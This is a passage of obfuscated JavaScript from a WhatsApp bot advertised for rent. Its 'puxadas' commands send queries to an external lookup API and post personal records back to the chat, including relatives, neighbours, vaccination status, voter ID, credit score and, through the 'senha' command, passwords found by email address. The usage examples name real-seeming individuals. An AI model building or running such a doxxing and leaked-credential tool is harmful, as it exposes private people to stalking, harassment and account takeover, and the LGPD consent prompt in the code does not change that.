                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x65b015);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x2db513 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x2db513);
                }
              } catch (_0x4df22b) {
                console.log(_0x4df22b);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "ip":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "ip numero");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x44ff11 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x5b0e2d = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x44ff11, _0x5b0e2d);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x25e23a = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x25e23a);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x168c93 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x168c93);
                }
              } catch (_0x34fd55) {
                console.log(_0x34fd55);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "cep":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x642b7e = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x12d437 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x642b7e, _0x12d437);
                let _0x275e89 = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x588477 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\nCEP: " + _0x275e89.cep + "\nRua: " + _0x275e89.street + "\nBairro: " + _0x275e89.neighborhood + "\nCidade: " + _0x275e89.city + "\nEstado: " + _0x275e89.state + "\nIBGE: " + _0x275e89.ibge + "\nGIA: " + _0x275e89.gia + "\nDDD: " + _0x275e89.ddd + "\nSIAFI: " + _0x275e89.siafi + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼 " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x588477);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0xc002d3 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0xc002d3);
                }
              } catch (_0x473f85) {
                console.log(_0x473f85);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "vizinhos":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "vizinhos numero cpf");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x419108 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x949346 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x419108, _0x949346);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x581b12 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x581b12);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x2f8c6e = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x2f8c6e);
                }
              } catch (_0xa3de2e) {
                console.log(_0xa3de2e);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "cnpj":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "cnpj numero");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x1d530f = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0xa66d0d = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x1d530f, _0xa66d0d);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x7f75d1 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x7f75d1);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x2bdc09 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x2bdc09);
                }
              } catch (_0x39b6b1) {
                console.log(_0x39b6b1);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "score":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "score numero");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x4aa30a = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x1d6136 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x4aa30a, _0x1d6136);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x11d882 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x11d882);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x532847 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x532847);
                }
              } catch (_0x14d0d4) {
                console.log(_0x14d0d4);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "titulo":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "titulo 987654321098");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x1caf4a = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x43e8fa = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x1caf4a, _0x43e8fa);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x4c8735 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x4c8735);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x17429a = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x17429a);
                }
              } catch (_0x862274) {
                console.log(_0x862274);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "email":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "email endereco de email");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x10fff8 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x2c87ff = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x10fff8, _0x2c87ff);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x13cfa3 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x13cfa3);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x2f99d7 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x2f99d7);
                }
              } catch (_0x5d2b54) {
                console.log(_0x5d2b54);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "vacina":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "vacina 45317828791");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x464b14 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x2b2c73 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x464b14, _0x2b2c73);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x459055 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x459055);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x21affb = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x21affb);
                }
              } catch (_0x1b6f5d) {
                console.log(_0x1b6f5d);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "parentes":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "parentes 45317828791");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x455123 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x534e40 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x455123, _0x534e40);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x54811a = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x54811a);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x48d1b0 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x48d1b0);
                }
              } catch (_0x5bbd09) {
                console.log(_0x5bbd09);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "senha":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "senha joaopaulogomes1979x@gmail.com");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x20d55f = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x353391 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x20d55f, _0x353391);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x3a5afa = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x3a5afa);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x58e77b = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x58e77b);
                }
              } catch (_0xaecedf) {
                console.log(_0xaecedf);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "mae":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "mae Tania Mara Moyses");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x194306 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x584273 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x194306, _0x584273);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0xf3fab5 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0xf3fab5);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x1f6cb5 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x1f6cb5);
                }
              } catch (_0x5ad329) {
                console.log(_0x5ad329);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "pai":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "pai Jair Messias Bolsonaro");
                }
                if (!_0x27b8b3) {
